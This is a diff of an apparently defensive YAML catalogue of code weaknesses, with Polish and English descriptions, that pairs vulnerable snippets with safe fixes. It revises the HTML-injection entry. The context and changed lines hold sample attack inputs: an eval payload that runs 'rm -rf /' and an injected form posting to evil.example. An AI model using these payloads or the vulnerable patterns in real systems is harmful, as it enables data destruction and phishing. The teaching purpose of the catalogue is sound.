@@ -495,19 +495,19 @@ threats:
   vuln: "def calc(expr):\n    return eval(expr)  # expr=\"__import__('os').system('rm -rf /')\"\n"
   safe: "import ast, operator as op\nOPS={ast.Add:op.add, ast.Sub:op.sub, ast.Mult:op.mul, ast.Div:op.truediv}\ndef calc(expr):\n    def ev(n):\n        if isinstance(n, ast.Constant): return n.value\n        if isinstance(n, ast.BinOp): return OPS[type(n.op)](ev(n.left), ev(n.right))\n        raise ValueError('niedozwolone')\n    return ev(ast.parse(expr, mode='eval').body)\n"
 - id: '1.24'
-  name: Html Injection
-  severity: Medium
+  name: HTML Injection
+  severity: High
   difficulty: Easy
   confidence: POSSIBLE
   cwe:
   - CWE-79
-  - CWE-80
-  desc: 'Nieoczyszczony input wstawiony do HTML pozwala wstrzyknąć znaczniki (np. formularz phishingowy) nawet bez skryptów.
+  - CWE-451
+  desc: 'Nieoczyszczony input wstawiony do HTML pozwala wstrzyknąć znaczniki (formularz phishingowy, przekierowanie meta-refresh, eksfiltracja przez CSS) nawet bez wykonania jakiegokolwiek skryptu.
 
     '
-  desc_en: Unsanitized input inserted into HTML allows tag injection (e.g., a phishing form) even without scripts.
+  desc_en: Unsanitized input inserted into HTML allows tag injection (a phishing form, a meta-refresh redirect, CSS-based exfiltration) even without any script executing.
   lang: javascript
-  vuln: 'el.innerHTML = "Witaj " + userName; // userName="<form action=//evil>"
+  vuln: 'el.innerHTML = "Witaj " + userName; // userName=''<form action=//evil.example>''
 
     '
   safe: 'el.textContent = "Witaj " + userName; // brak interpretacji HTML
